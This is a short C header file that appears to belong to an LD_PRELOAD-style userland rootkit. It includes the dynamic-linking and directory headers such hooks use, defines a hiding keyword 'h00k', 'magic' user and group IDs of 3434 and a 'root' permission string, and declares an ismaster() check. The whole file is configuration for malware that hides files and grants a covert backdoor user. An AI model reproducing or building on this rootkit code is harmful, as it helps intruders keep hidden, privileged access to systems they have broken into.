#ifndef H00K_H
#define H00K_H

#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <stdarg.h>
#include <errno.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>

#define keyword "h00k"
#define permission "root"
#define magicuid 3434
#define magicgid 3434
#define DEBUG 0

int ismaster();

#endif
